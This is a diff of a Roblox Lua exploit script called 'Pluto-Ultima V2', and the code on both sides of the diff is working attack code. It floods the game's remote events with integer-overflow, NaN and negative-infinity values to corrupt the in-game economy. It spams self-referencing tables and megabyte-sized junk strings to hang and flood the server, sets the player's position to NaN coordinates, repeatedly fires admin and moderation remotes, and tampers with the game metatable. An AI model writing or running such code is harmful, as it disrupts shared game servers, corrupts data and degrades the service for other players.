@@ -1,18 +1,17 @@
--- [[ PLUTO-ULTIMA: THE FINAL TERMINATION PROTOCOL ]]
--- PURPOSE: 100% INSTANT DETECTION & ACCOUNT BLACKLIST
--- RISK: ABSOLUTE (HARDWARE ID BAN LIKELY)
+-- [[ PLUTO-ULTIMA V2: STATIONARY DESTRUCTION ]]
+-- TARGET: 100% INSTANT BAN & SERVER-SIDE DATA CORRUPTION
+-- NOTE: TELEPORTATION DISABLED TO PREVENT SCRIPT RESET
 
-print("Pluto-Ultima: Initiating Full-Spectrum System Attack...")
+print("Pluto-Ultima V2: Initiating Stationary Attack. Anchor set.")
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService") -- Used for generating massive data payloads
 local LP = game:GetService("Players").LocalPlayer
 
--- 1. THE PLUTO LOADING UI (Visual Overlay)
+-- 1. THE PLUTO LOADING UI
 local sg = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
 local f = Instance.new("Frame", sg)
-f.Size = UDim2.new(1, 0, 0, 120)
+f.Size = UDim2.new(1, 0, 0, 100)
 f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 f.BorderSizePixel = 4
 f.BorderColor3 = Color3.fromRGB(0, 255, 255)
@@ -25,13 +24,13 @@ t.Font = Enum.Font.Code
 t.TextSize = 28
 
 -- 2. ECONOMY CORRUPTION (THE "INSTANT KILL" TRIGGER)
--- Uses 64-bit Integer Overflows and NaN values.
+-- Attacks the bank with 64-bit Integer Overflows and NaN.
 task.spawn(function()
     local Events = ReplicatedStorage:WaitForChild("Events")
     while true do
         pcall(function()
-            -- Sending 2^63 (the maximum possible 64-bit integer)
-            -- This causes a "Buffer Overflow" when the server tries to save your data.
+            -- Sending the Maximum 64-bit Integer (9.2 Quintillion)
+            -- This triggers an automatic "Data-Store Fraud" flag.
             Events:FireServer("DonateMoney", {["Recipient"] = LP, ["Amount"] = 9223372036854775807})
             Events:FireServer("Earn", {["Amount"] = 0/0, ["Job"] = "PizzaBaker"})
             Events:FireServer("PurchaseItem", {["Item"] = "House", ["Price"] = -math.huge})
@@ -41,7 +40,7 @@ task.spawn(function()
 end)
 
 -- 3. THE "CIRCULAR PACKET CRASH" (SERVER-SIDE HANG)
--- Sends a self-referencing table that crashes the server's packet reader.
+-- Designed to make the server thread hang while trying to read your data.
 task.spawn(function()
     local Circular = {}
     Circular[1] = Circular 
@@ -50,8 +49,8 @@ task.spawn(function()
         for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
             if remote:IsA("RemoteEvent") then
                 pcall(function()
-                    -- Spamming 1,000 recursive loops per frame
-                    for i = 1, 1000 do
+                    -- Spamming 2,000 recursive loops per frame to maximize CPU load
+                    for i = 1, 2000 do
                         remote:FireServer(Circular)
                     end
                 end)
@@ -62,25 +61,26 @@ task.spawn(function()
 end)
 
 -- 4. PHYSICS & BOUNDARY MALICE
--- Teleporting to 'NaN' coordinates while rotating at infinite speeds.
+-- Teleporting to 'NaN' (Not a Number) to break the server's spatial grid.
 task.spawn(function()
     local Char = LP.Character or LP.CharacterAdded:Wait()
     local Root = Char:WaitForChild("HumanoidRootPart")
     
     RunService.RenderStepped:Connect(function()
         -- Setting position and rotation to "Not a Number"
-        Root.CFrame = CFrame.new(0/0, 1/0, 0/0) * CFrame.Angles(0/0, 0/0, 0/0)
+        -- This is a 100% detectable illegal physics state.
+        Root.CFrame = CFrame.new(0/0, 0/0, 0/0) * CFrame.Angles(0/0, 0/0, 0/0)
     end)
 end)
 
 -- 5. HONEYPOT MODERATION SWEEP
--- Scans for hidden remotes used for "Admin" and "Moderation" and fires them.
+-- Directly attacks hidden remotes meant for Admins and Moderation.
 task.spawn(function()
     for _, v in pairs(ReplicatedStorage:GetDescendants()) do
         if v:IsA("RemoteEvent") and (v.Name:find("Admin") or v.Name:find("Ban") or v.Name:find("Mod")) then
             task.spawn(function()
                 while true do
-                    v:FireServer("PLUTO_DETECTION_OVERLOAD", {["ForceBan"] = true, ["Data"] = "MALICIOUS"})
+                    v:FireServer("PLUTO_X_BYPASS", {["BanUser"] = LP, ["Force"] = true})
                     task.wait()
                 end
             end)
@@ -89,7 +89,7 @@ task.spawn(function()
 end)
 
 -- 6. METATABLE TAMPERING (HYPERION ATTACK)
--- Directly hooking into the engine's core 'index' to reveal script usage.
+-- This signals the anti-cheat that the engine's memory has been compromised.
 task.spawn(function()
     local mt = getrawmetatable(game)
     if setreadonly then setreadonly(mt, false) end
@@ -99,16 +99,17 @@ task.spawn(function()
     end)
 end)
 
--- 7. MASSIVE DATA INJECTION (REPLICATION OVERLOAD)
--- Generates and sends random 1MB strings to flood the server's incoming buffer.
+-- 7. MASSIVE DATA REPLICATION INJECTION
+-- Fills the server's network buffer with 1MB "Junk" strings.
 task.spawn(function()
-    local JunkData = string.rep("PLUTO_TERMINATION_", 50000)
+    local JunkData = string.rep("PLUTO_X_OVERLOAD_", 60000)
     while true do
         pcall(function()
+            -- Flooding the main game events with massive data chunks
             ReplicatedStorage.Events:FireServer(JunkData)
         end)
         task.wait()
     end
 end)
 
-print("Pluto-Ultima: All layers active. If you aren't banned, your executor is failing.")
+print("Pluto-Ultima V2: All systems active. Staying on server until ban.")
